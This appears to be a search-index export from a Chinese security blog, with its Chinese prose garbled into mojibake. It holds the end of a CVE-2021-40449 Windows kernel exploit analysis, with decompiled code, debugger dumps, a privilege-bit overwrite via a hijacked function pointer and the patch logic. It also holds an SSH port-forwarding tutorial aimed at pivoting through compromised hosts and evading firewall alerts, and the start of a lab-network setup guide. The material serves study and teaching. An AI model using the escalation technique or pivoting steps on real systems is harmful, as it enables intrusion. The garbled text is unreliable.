†ç©ºé—´å¤§å°ã€‚\n__int64 __fastcall Win32AllocPool(__int64 a1, unsigned int a2) { unsigned int v2; // ebx __int64 v3; // rdi __int64 result; // rax v2 = a2; v3 = a1; if ( (signed int)IsWin32AllocPoolImplSupported_0() \u0026lt; 0 ) result = 0i64; else result = Win32AllocPoolImpl_0(33i64, v3, v2); return result; } åŒæ—¶åœ¨Pocä»£ç åˆ†æé‡Œé¢åˆ†æäº†DCå¯¹è±¡å‡½æ•°æŒ‡é’ˆå’Œå †å¤´ä¹‹é—´çš„ä½ç½®å…³ç³»ï¼Œæ‰€ä»¥é€šè¿‡æ„é€ ä¼ å…¥CreatePaletteçš„LOGPALETTEç»“æ„å¯ä»¥åˆšåˆšå¥½è¦†ç›–åŸDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆä»¥åŠè¯¥å‡½æ•°æŒ‡é’ˆè¦è°ƒç”¨çš„å‚æ•°ï¼Œå†…å­˜åˆ†å¸ƒå…·ä½“è§https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp é‡Œé¢çš„æ³¨é‡Šã€‚\né€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨RtlSetAllBitså‡½æ•°å¹¶ä¼ å…¥RtklBitMapå‹æŒ‡é’ˆï¼Œå…¶ä¸­RtlBitMapçš„bufferæŒ‡å‘POCè¿›ç¨‹è‡ªèº«çš„æƒé™ä½ï¼Œå¦‚ä¸‹å›¾ï¼š\ntypedef struct _RTL_BITMAP { ULONG SizeOfBitMap; ULONG *Buffer; } RTL_BITMAP, *PRTL_BITMAP; 0: kd\u0026gt; dq ffff885e80063000+0x750 // æ­¤å¤„ä¸ºRtlBitMapåœ°å€ ffff885e`80063750 ffffb48d`a3839010 ffffffff`ffffffff ffff885e`80063760 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063770 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063780 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063790 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637a0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637b0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637c0 ffffffff`ffffffff ffffffff`ffffffff 0: kd\u0026gt; dq ffffb48d`a3839010\t// æ­¤å¤„å­˜æ”¾äº†RtlBitMapç»“æ„ï¼Œ0x00-0x08ä¸ºsizeï¼Œ0x08-0x10ä¸ºbufferæŒ‡é’ˆï¼ŒæŒ‡å‘äº†è‡ªèº«çš„æƒé™ä½ ffffb48d`a3839010 00000000`00000080 ffffde8f`1fb2e9d0 ffffb48d`a3839020 41414141`41414141 41414141`41414141 ffffb48d`a3839030 00000000`00000000 00000000`00000000 ffffb48d`a3839040 00000000`00000000 00000000`00000000 ffffb48d`a3839050 00000000`00000000 00000000`00000000 ffffb48d`a3839060 00000000`00000000 00000000`00000000 ffffb48d`a3839070 00000000`00000000 00000000`00000000 ffffb48d`a3839080 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq ffffde8f`1fb2e9d0 ffffde8f`1fb2e9d0 00000006`02880000 00000000`00800000 ffffde8f`1fb2e9e0 00000000`00800000 00000000`00000000 ffffde8f`1fb2e9f0 00000000`00000000 00000000`00000000 ffffde8f`1fb2ea00 20010000`00000000 0000000f`00000001 ffffde8f`1fb2ea10 000001e0`00000000 00000000`00001000 ffffde8f`1fb2ea20 00000000`00000000 ffffde8f`1fb2ee18 ffffde8f`1fb2ea30 00000000`00000000 ffffde8f`1f1007f0 ffffde8f`1fb2ea40 ffffde8f`1f1007f0 ffffde8f`1f10080c è°ƒç”¨DCé‡Œé¢çš„å‡½æ•°æŒ‡é’ˆä¹‹å‰ï¼Œè‡ªèº«æƒé™ä½ä¸ºæ­£å¸¸æƒé™ã€‚\nè°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æƒé™ä½å…¨éƒ¨ç½®ä¸ºäº†1\nè¡¥ä¸åˆ†æ åœ¨æ¼æ´åˆ©ç”¨åˆ†æé‡Œé¢åˆ†æè¿‡æ¼æ´å½¢æˆåŸå› æ˜¯å› ä¸ºåœ¨è°ƒç”¨GreResetDCInternalå‡½æ•°æ—¶ï¼Œä½¿ç”¨DCå¯¹è±¡æŒ‡é’ˆçš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥DCå¯¹è±¡æ˜¯å¦å¼‚å¸¸ã€‚è€Œåˆ©ç”¨è¯¥æ¼æ´æ˜¯é€šè¿‡åœ¨è°ƒç”¨å›è°ƒå‡½æ•°æ—¶è°ƒç”¨ResetDCå®ç°çš„ã€‚\næˆ‘ä»¬å†æ¬¡å›é¡¾ä¸€ä¸‹æ¼æ´å‡½æ•°ï¼Œåœ¨è°ƒç”¨hdcOpenDCWä¹Ÿå°±æ˜¯åœ¨è°ƒç”¨å›è°ƒå‡½æ•°ä¹‹å‰ä¼šé€šè¿‡DCOçš„æ„é€ å‡½æ•°ä»DCæ„é€ DCOå¯¹è±¡ï¼Œåœ¨åŸºæœ¬æ¦‚å¿µä¸­çŸ¥é“ï¼Œå†…æ ¸å¯¹è±¡æ¯è¢«å¼•ç”¨ä¸€æ¬¡åˆ™å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨å€¼ä¼šåŠ ä¸€ã€‚è°ƒç”¨æ„é€ å‡½æ•°æ—¶ï¼ŒDCå¯¹è±¡å¼•ç”¨åŠ ä¸€ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ­¤æ—¶DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°è¦ä¸º1ã€‚å¦‚æœåœ¨å›è°ƒå‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ResetDCï¼Œåˆ™ä¼šç¬¬äºŒæ¬¡è°ƒç”¨GreResetDCInternalï¼Œå†æ¬¡è°ƒç”¨DCOçš„æ„é€ å‡½æ•°ï¼ŒDCå¯¹è±¡å¼•ç”¨å†æ¬¡åŠ ä¸€ï¼Œæ­¤æ—¶å¼•ç”¨æ¬¡æ•°ä¸º2ã€‚\næ‰€ä»¥åˆ¤æ–­DCå¯¹è±¡å¼‚å¸¸å¯ä»¥é€šè¿‡åˆ¤æ–­DCå¯¹è±¡çš„å¼•ç”¨æ¬¡æ•°å®ç°ã€‚\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // åˆ©ç”¨æ„é€ å‡½æ•°ä»HDCåˆ›å»ºDCOBJå¯¹è±¡ v8 = v25; Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· v10 = *(_QWORD *)(v8 + 48);\t// èµ‹å€¼ *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; Â·Â·Â·Â·Â·Â·Â· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; Â·Â·Â·Â·Â·Â·Â· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„DCå¯¹è±¡ï¼Œè¿”å›å¯¹åº”çš„HDCå¥æŸ„ if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// è°ƒç”¨å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºç”¨æˆ·ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å†…çš„å€¼ Â·Â·Â·Â·Â·Â·Â· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â· bDeleteDCInternal(v6, 1i64, 0i64); // åˆ é™¤äº†hdcOpenDCWåˆ†é…çš„HDCï¼Œä½†å‰é¢ç»è¿‡HmgSwapLockedHandleContentsäº¤æ¢äº†å¥æŸ„ï¼Œå®é™…åˆ é™¤çš„æ˜¯æ—§çš„HDC Â·Â·Â·Â·Â·Â· åœ¨è¡¥ä¸ä¸­ï¼Œå¢åŠ äº†å¯¹DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°è¿›è¡Œåˆ¤æ–­çš„é€»è¾‘ï¼Œå¦‚æœåœ¨GreResetDCInternalå‡½æ•°ä¸­DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°å¤§äº1åˆ™è¡¨æ˜å·²ç»å‘ç”Ÿå¼‚å¸¸ï¼Œè¿›å…¥å¼‚å¸¸é€»è¾‘æŠ›å‡ºé”™è¯¯(å› ä¸ºæŒ‰æ­£å¸¸æµç¨‹æ­¤å¤„DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°åº”ä¸ºä¸åº”è¯¥å¤§äº1)ã€‚\n__int64 __fastcall sub_1C014CB0C(__int64 a1, __int64 a2, int *a3) { ...... int *v30; // [rsp+30h] [rbp-1h] ..... v9 = (__int64)v30; if ( !v30 ) { LABEL_6: EngSetLastError(6i64); LABEL_7: v13 = (__int64)v30; goto LABEL_8; } if ( *((_WORD *)v30 + 6) \u0026gt; 1u ) { if ( *(_DWORD *)\u0026amp;stru_1C032C3F8.Length \u0026gt; 5u \u0026amp;\u0026amp; (unsigned __int8)sub_1C00B5068(\u0026amp;stru_1C032C3F8, 0x400000000000i64) ) { v31 = \u0026amp;v25; v30 = \u0026amp;v26; v29 = \u0026amp;v28; v28 = 0x1000000i64; SysEntryGetDispatchTableValues(v10, (__int64)\u0026amp;unk_1C02F466B, v11, v12); } goto LABEL_6; } å‚è€ƒé“¾æ¥ï¼š\nhttps://www.secrss.com/articles/35266\nhttps://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ\nhttps://bbs.pediy.com/thread-269930.htm\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/ssh-tunnel/","title":"SSHéš§é“","tags":[],"description":"","content":"SSHéš§é“ SSHæä¾›äº†ä¸‰ç§è½¬å‘æ¨¡å¼ï¼šæœ¬åœ°ç«¯å£è½¬å‘ã€è¿œç¨‹ç«¯å£è½¬å‘ä»¥åŠåŠ¨æ€ç«¯å£è½¬å‘ï¼Œæœ¬æ–‡å°†ä»‹ç»è¿™ä¸‰ç§è½¬å‘æ¨¡å¼çš„ç”¨æ³•ã€‚\nä¸€äº›åŸºæœ¬æ¦‚å¿µ æœ¬åœ°ä¸»æœºï¼šSSHå®¢æˆ·ç«¯æ‰€åœ¨çš„ä¸»æœºã€‚\nè¿œç¨‹ä¸»æœºï¼šç›¸å¯¹äºæœ¬åœ°ä¸»æœºçš„æ¦‚å¿µï¼Œåœ¨æœ¬åœ°ä¸»æœºä¹‹å¤–çš„ä¸»æœºå«è¿œç¨‹ä¸»æœºã€‚\nSSHå‘½ä»¤è¡Œå‚æ•°è§£é‡Š\n-C:å‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦ -f:å°†sshè½¬å…¥åå°æ‰§è¡Œ -N:å»ºç«‹é™é»˜è¿æ¥ï¼ˆè¿æ¥åçœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰ -g:å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ -L:æœ¬åœ°ç«¯å£è½¬å‘ -R:è¿œç¨‹ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ï¼Œå³å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœºä¸Šï¼Œå‘½ä»¤æ ¼å¼ï¼šssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\nä¸¾ä¾‹ï¼š\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d åœ¨SSH Clientè¿è¡Œå‘½ä»¤ssh -CfNg -L 127.0.0.1:1313:127.0.0.1:1313 root@a.b.c.d ï¼Œå°†127.0.0.1:1313ç«¯å£è½¬å‘åˆ°SSH Serverçš„127.0.0.1:1313ç«¯å£ä¸Šã€‚æ­¤æ—¶SSH Clientè®¿é—®127.0.0.1:1313çš„ç»“æœè·Ÿè®¿é—®åœ¨SSH Serverç«¯çš„127.0.0.1:1313ç»“æœä¸€æ ·ã€‚\nåœ¨SSH Clientä¸Š\næ­¤æ—¶åœ¨SSH Clientä¸Šçš„sshä¼šç›‘å¬127.0.0.1:1313è¿™ä¸ªç«¯å£ï¼Œè¯¥ç«¯å£çš„TCPæ•°æ®é€šè¿‡sshéš§é“ä¼ è¾“åˆ°SSH serverä¸Šã€‚\nåœ¨SSH Serverä¸Šï¼Œå…ˆç›‘å¬127.0.0.1:1313ç«¯å£ï¼Œæœ¬æ–‡ç›‘å¬ä½¿ç”¨hugo å¯åŠ¨ä¸€ä¸ªserverã€‚\nåœ¨SSH Clientä¸Šä½¿ç”¨curl 127.0.0.1:1313å‘½ä»¤æ—¶è¿”å›çš„å†…å®¹å³ä¸ºSSH Serverä¸Š127.0.0.1:1313çš„å†…å®¹\nåŒæ—¶æœ¬åœ°ç«¯å£è½¬å‘å‘½ä»¤ä¸­remote ipä¸æ­¢é™åˆ¶åœ¨127.0.0.1ä¸Šï¼Œremote ipå¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªSSH Serverèƒ½å¤Ÿè¿æ¥çš„hostï¼Œå®é™…ä¸Šæœ¬åœ°ç«¯å£è½¬å‘è¿‡ç¨‹ä¸­ï¼Œå®é™…ä¸Šæ˜¯æŠŠSSH Serverå½“ä½œè·³æ¿æœºï¼Œè¿é€šSSH Clientå’ŒSSH Serverå¦å¤–ä¸€ç«¯çš„ä¸»æœºï¼Œå¦‚ä¸‹ï¼š\n|SSH Client| \u0026lt;-------------\u0026gt;|SSH Server| \u0026lt;--------------\u0026gt;|SSH Clientä¸èƒ½è®¿é—®ä½†æ˜¯SSH Serverèƒ½è®¿é—®çš„ä¸»æœº|\næœ¬åœ°ç«¯å£è½¬å‘ä¸€èˆ¬åº”ç”¨åœºæ™¯ä¸ºåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æ§åˆ¶äº†ç›®æ ‡ç½‘ç»œä¸­å¸¦æœ‰SSH Serverçš„ä¸€å°æœºå™¨ï¼Œé€šè¿‡è¿™å°æœºå™¨åšä¸ºè·³æ¿æœºæ¥è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœºä¸Šçš„æœåŠ¡ã€‚ä¸€å®šç¨‹åº¦ä¸Šè§„é¿é˜²ç«å¢™çš„æµé‡å‘Šè­¦ï¼ˆå› ä¸ºsshæµé‡ä¸ºåŠ å¯†æµé‡ï¼‰\nè¿œç¨‹ç«¯å£è½¬å‘ã€‚ è¿œç¨‹ç«¯å£è½¬å‘å³å’Œæœ¬åœ°ç«¯å£è½¬å‘æ˜¯ç›¸åçš„æ¦‚å¿µï¼Œæœ¬åœ°ç«¯å£è½¬å‘æ˜¯å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ç«¯å£ä¸Šï¼Œè¿æ¥æœ¬åœ°ç«¯å£å³è·Ÿè¿æ¥è¿œç¨‹ç«¯å£ä¸€ä¸ªæ•ˆæœã€‚è€Œè¿œç¨‹ç«¯å£è½¬å‘å³å°†è¿œç¨‹ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼Œä½¿å¾—è¿æ¥è¿œç¨‹ç«¯å£å³è·Ÿè¿æ¥æœ¬åœ°ç«¯å£ä¸€æ ·ã€‚å‘½ä»¤æ ¼å¼ï¼šssh -R \u0026lt;remote port\u0026gt;:\u0026lt;local ip\u0026gt;:\u0026lt;local port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\nä¸¾ä¾‹ï¼š\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d æœ¬æ¬¡æˆ‘ä»¬å°†SSH Clientçš„3389ç«¯å£è½¬å‘åˆ°SSH Serverï¼ˆå…¬ç½‘æœåŠ¡å™¨ï¼‰ä¸Šï¼Œä½¿å¾—å¦å¤–ä¸€å°æœºå™¨èƒ½å¤Ÿé€šè¿‡SSH Serverçš„ç«¯å£è¿æ¥åˆ°ä½äºå±€åŸŸç½‘çš„SSH Clientçš„è¿œç¨‹æ¡Œé¢ã€‚\nåœ¨ssh clientä¸Šè¿è¡Œå‘½ä»¤\næ­¤æ—¶ä»»ä½•è¿æ¥SSH Server:9898çš„è¯·æ±‚éƒ½ä¼šè¢«è½¬å‘åˆ°SSH Clientçš„58989ç«¯å£ä¸Šï¼Œè¯¥ç«¯å£ç›‘å¬çš„æœåŠ¡ä¸ºè¿œç¨‹æ¡Œé¢æœåŠ¡ã€‚åœ¨å¦å¤–ä¸€å°ç”µè„‘ï¼ˆä¸åŒäºSSH Serverå’ŒSSH Clientï¼‰ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥SSH Server:9898\nåŒæœ¬åœ°ç«¯å£è½¬å‘ä¸€æ ·ï¼Œè¿œç¨‹ç«¯å£è½¬å‘å‘½ä»¤ä¸­çš„local ipå¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªSSH Clientèƒ½å¤Ÿè¿æ¥çš„hostï¼Œæ­¤æ—¶SSH Clientè¢«å½“ä½œè·³æ¿æœºï¼Œè¿é€šSSH Clientå¦å¤–ä¸€ç«¯å’ŒSSH Serverç«¯çš„ä¸»æœºã€‚\n|SSH Serveèƒ½å¤Ÿè¿é€šçš„ä¸»æœº| \u0026lt;--------------\u0026gt; |SSH Client| \u0026lt;--------------\u0026gt; |SSH Clientèƒ½è®¿é—®ä½†æ˜¯SSH Serverä¸èƒ½è®¿é—®çš„ä¸»æœº|\nè¿œç¨‹ç«¯å£è½¬å‘åº”ç”¨åœºæ™¯ä¸€èˆ¬æ˜¯å°†å±€åŸŸç½‘çš„æŸäº›æœåŠ¡é€šè¿‡SSHéš§é“æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œæˆ–è€…åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæ§åˆ¶äº†å†…ç½‘çš„æŸå°ä¸»æœºï¼Œé€šè¿‡è¿œç¨‹ç«¯å£è½¬å‘ï¼Œå°†è¯¥ä¸»æœºä½œä¸ºè·³æ¿æœºæ¥è®¿é—®å†…ç½‘å…¶ä»–æœåŠ¡ï¼Œå› ä¸ºæ­¤æ—¶SSHæ˜¯ä»å†…ç½‘è¿æ¥åˆ°å¤–ç½‘ï¼Œåœ¨æµé‡ä¸Šæ²¡æœ‰é‚£ä¹ˆå¯ç–‘ã€‚\nåŠ¨æ€ç«¯å£è½¬å‘ åœ¨æœ¬åœ°ç«¯å£è½¬å‘å’Œè¿œç¨‹ç«¯å£è½¬å‘è¿‡ç¨‹ä¸­ï¼Œä¸€æ¬¡æ€§åªèƒ½è½¬å‘ä¸€ä¸ªç«¯å£ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹æ•ˆç‡å¤ªä½äº†ï¼Œè€ŒåŠ¨æ€ç«¯å£è½¬å‘æ²¡æœ‰æŒ‡å®šç›®çš„ç«¯å£ï¼Œç›¸å¯¹äºå‰ä¸¤ç§æ¥è¯´æ›´çµæ´»ã€‚å®é™…ä¸ŠåŠ¨æ€ç«¯å£è½¬å‘å³ä¸ºSSHå®ç°çš„SOCKSåè®®ã€‚å‘½ä»¤æ ¼å¼:ssh -D port \u0026lt;username\u0026gt;@\u0026lt;SSH host\u0026gt;ã€‚\nåœ¨SSH Clientæ‰§è¡Œå‘½ä»¤å³å¯åœ¨SSH Clientå’ŒSSH Serverä¹‹é—´å»ºç«‹socks5éš§é“ï¼ŒSSH Clientå¯ä»¥è¿æ¥è¯¥éš§é“æ¥ä¼ è¾“æ•°æ®ã€‚\nç»„åˆåˆ©ç”¨ åœ¨ä¸€äº›æƒ…å†µä¸‹å¯ä»¥é€šè¿‡ç»„åˆä¸Šé¢ä¸‰ç§è½¬å‘æ¥è¾¾åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚\nä¾‹å¦‚ï¼Œæœ‰ä¸¤å°ä½äºäº’ä¸ç›¸é€šçš„å±€åŸŸç½‘ä¸»æœºï¼Œå¦‚æœä¸€å°æƒ³è¦è®¿é—®å¦å¤–ä¸€å°èƒ½å¤Ÿè®¿é—®çš„æœåŠ¡æ—¶ï¼Œå¯ä»¥ä»¥ä¸‹é¢çš„æ–¹å¼è¾¾åˆ°ç›®çš„\nåœ¨ä¸»æœº1ä¸Šæ‰§è¡Œå‘½ä»¤ ssh -CfNg -R 9898:192.168.50.1:22 root\u0026lt;SSH Server\u0026gt; å°†ä¸»æœº1çš„sshç«¯å£è½¬å‘åˆ°å…¬ç½‘æœåŠ¡å™¨çš„9898ç«¯å£ã€‚\nåœ¨ä¸»æœº2æ‰§è¡Œå‘½ä»¤ssh -D 12222 -p 9898 \u0026lt;username\u0026gt;@\u0026lt;SSH Server\u0026gt; æ­¤æ—¶sshè¿æ¥çš„æ˜¯ä¸»æœº1ï¼Œä¸”å»ºç«‹äº†sockséš§é“ï¼Œé€šè¿‡è¯¥éš§é“ä¸»æœº2å¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨ä¸»æœº1èƒ½è®¿é—®è€Œä¸»æœº2ä¸èƒ½ç›´æ¥è®¿é—®çš„æœåŠ¡ã€‚\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/","title":"åŸºäºVmwareçš„å°å‹åŸŸç½‘ç»œæ­å»º","tags":[],"description":"","content":"åŸºäºVmwareçš„å°å‹åŸŸç½‘ç»œæ­å»º æ‘˜è¦ åœ¨æ¸—é€çš„æ—¥å¸¸å­¦ä¹ è¿‡ç¨‹ä¸­ç»å¸¸éœ€è¦ä¸€ä¸ªå†…ç½‘ç¯å¢ƒï¼Œæœ¬ç¯‡æ–‡ç« ä»‹ç»å¦‚ä½•ä½¿ç”¨Vmwareå’ŒMikroTikæ­å»ºç®€æ˜“çš„äºŒå±‚å†…ç½‘ç¯å¢ƒã€‚\nç½‘ç»œç»“æ„ æ•´ä¸ªç½‘ç»œåˆ†ä¸ºç»“æ„åˆ†ä¸ºä¸‰å±‚ï¼Œç¬¬ä¸€å±‚æ¨¡æ‹Ÿå¤–ç½‘ç¯å¢ƒï¼Œç¬¬äºŒå±‚ä¸ºDMZåŒºåŸŸï¼Œè¯¥åŒºåŸŸé€šè¿‡è¾¹ç•Œè·¯ç”±å™¨çš„ç«¯å£æ˜ å°„ï¼Œå°†ç¬¬äºŒå±‚ç½‘ç»œä¸»æœºçš„ä¸€äº›ç«¯å£æ˜ å°„åˆ°è¾¹ç•Œè·¯ç”±å™¨ä¸Šå¯¹å¤–æä¾›æœåŠ¡ï¼Œç¬¬ä¸‰å±‚æ¨¡æ‹ŸåŠå…¬ç½‘ï¼Œè¯¥å±‚ç½‘ç»œä¸ºåŸŸç½‘ç»œï¼ŒåŒæ—¶å¯ä»¥æ§åˆ¶ç¬¬äºŒå±‚ç½‘ç»œçš„ä¸»æœºã€‚\næ•´ä¸ªç½‘ç»œæ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š\nIPè®¾ç½®ï¼š\nç¬¬ä¸€å±‚ç½‘ç»œä¸ºï¼ˆå¤–ç½‘ï¼‰ï¼š192.168.59.0/24\nç¬¬äºŒå±‚ç½‘ç»œä¸ºï¼ˆDMZåŒºåŸŸï¼‰ï¼š192.168.72.0/24\nç¬¬ä¸‰å±‚ç½‘ç»œä¸ºï¼ˆåŠå…¬ç½‘ï¼‰ï¼š172.16.2.0/24\nè·¯ç”±å™¨IPåœ°å€ï¼š\nè¾¹ç•Œè·¯ç”±å™¨ï¼š192.168.59.141 | 192.168.72.2\nå†…ç½‘è·¯ç”±å™¨ï¼š192.168.72.254 | 172.16.2.254\nç½‘ç»œæ­å»º ç½‘ç»œè®¾ç½® é¦–å…ˆä½¿ç”¨VMwareçš„è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨å¢åŠ ä¸¤ä¸ªç½‘ç»œVMnet2ã€VMnet3ï¼Œéƒ½å‹¾é€‰ä»…ä¸»æœºæ¨¡å¼ï¼ŒåŒæ—¶å–æ¶ˆä¸‹é¢ä¸¤ä¸ªå‹¾ï¼Œå¦‚ä¸‹å›¾ï¼š\nVMnet3åŒç†ï¼ŒåŒæ—¶åœ¨DHCPè®¾ç½®å¤„è®¾ç½®ç›¸åº”çš„IPåœ°å€å’Œæ©ç ã€‚å…¶ä¸­å¤–å±‚ç½‘ç»œä¸ºnatæ¨¡å¼ï¼ŒVMnet2ä¸ºDMZåŒºåŸŸç½‘ç»œï¼ŒVMnet3ä¸ºåŠå…¬ç½‘ç»œ\nè™šæ‹Ÿæœºæ­å»º æ•´ä¸ªç½‘ç»œåœ¨æœ€å°‘æƒ…å†µä¸‹ä¸€å…±éœ€è¦å…­å°è™šæ‹Ÿæœºï¼Œåˆ†ä¸ºä¸¤å°ROSï¼Œå››å°ç½‘ç»œä¸­çš„ä¸»æœºã€‚\nROSä»hxxps://mikrotik.com/downloadä¸‹è½½stableç‰ˆæœ¬çš„ovaæ ¼å¼çš„é•œåƒï¼Œä¹‹åå¯¼å…¥åˆ°VMwareä¸­ã€‚ä¸€å…±éœ€è¦å¯¼å…¥ä¸¤æ¬¡ï¼Œåˆ†åˆ«å‘½åä¸ºROSï¼ŒROS-1ã€‚é™¤äº†ä¸‹è½½é•œåƒä¹‹å¤–è¿˜éœ€è¦ä¸‹è½½winboxæ–¹ä¾¿å¯¹è·¯ç”±å™¨è¿›è¡Œè®¾ç½®ã€‚\nç½‘ç»œä¸­ä¸»æœºåˆ†å¸ƒï¼š\nDMZï¼šUbuntu 2004ã€windows7\nåŠå…¬ç½‘ï¼šWindows server2019ã€windows7\nåˆ›å»ºä¸Šè¿°è™šæ‹Ÿæœºï¼Œå¹¶å°†DMZåŒºåŸŸçš„ä¸»æœºçš„ç½‘å¡è®¾ç½®ä¸ºVMnet2ï¼ŒåŠå…¬ç½‘çš„ä¸»æœºè®¾ç½®ä¸ºVMnet3.\nå°†è¾¹ç•Œè·¯ç”±å™¨ROSç½‘å¡è®¾ç½®ä¸ºnetæ¨¡å¼å’ŒVMnet2æ¨¡å¼ï¼Œå†…ç½‘è·¯ç”±å™¨è®¾ç½®ä¸ºVMnet2å’ŒVMnet3æ¨¡å¼ã€‚\nIPåœ°å€åŠè·¯ç”±å™¨è®¾ç½® ç»å†ä¸Šé¢çš„æ­¥éª¤ä¹‹åï¼ŒåŸºæœ¬çš„ç½‘ç»œæ‹“æ‰‘å·²ç»æ­å»ºå®Œæˆï¼Œæ¥ä¸‹æ¥éœ€è¦å¯¹ç½‘ç»œå†…çš„ä¸»æœºå’Œè·¯ç”±å™¨è¿›è¡Œè®¾ç½®ä½¿å¾—ç½‘ç»œä¸­çš„ä¸»æœºèƒ½å¤Ÿç›¸äº’pingé€šã€‚\né¦–å…ˆè®¾ç½®ä¸¤ä¸ªç½‘ç»œä¸­çš„ä¸»æœºIPåœ°å€\nDMZï¼š\nWindows7ï¼š192.168.72.4/24 ç½‘å…³192.168.72.2 DNS114.114.114.114\nUbuntu ï¼š192.168.72.3/24 ç½‘å…³192.168.72.2 DNS114.\n114.114.114\nåŠå…¬ç½‘ï¼š\nWindows server 2019ï¼š172.16.2.4/24 ç½‘å…³172.16. 2.254 DNS127.0.0.1\nwindows7ï¼š172.16.2.3/24 ç½‘å…³172.16.2.254 DNS172.16.2.4\nè‡³æ­¤ï¼Œä¸¤ä¸ªç½‘ç»œçš„ä¸»æœºåº”è¯¥å¯ä»¥pingé€šåŒä¸€ä¸ªç½‘ç»œçš„ä¸»æœºã€‚æ¥ä¸‹æ¥è®¾ç½®ä¸¤ä¸ªROSçš„IPåœ°å€ã€‚\næ‰“å¼€winboxï¼Œç‚¹å‡»NeighborsæŒ‰é’®ï¼Œä¼šè‡ªåŠ¨å—…æ¢ç½‘ç»œå†…çš„å­˜æ´»çš„è·¯ç”±å™¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\nä¸Šå›¾ä¸ºè¾¹ç•Œè·¯ç”±å™¨çš„IPåœ°å€ï¼Œå¦‚æœåˆ†é…äº†IPåœ°å€åˆ™å¯ä»¥åœ¨æµè§ˆå™¨é€šè¿‡IPåœ°å€æµè§ˆè·¯ç”±å™¨çš„webç•Œé¢ï¼Œåœ¨å¦‚æœæ²¡æœ‰åˆ†é…IPåœ°å€åˆ™é€šè¿‡wibboxä½¿ç”¨MACåœ°å€ç™»å½•\nè¿›å…¥ä¹‹åï¼Œåœ¨å·¦ä¾§é€‰é¡¹å¡ä¼šåˆ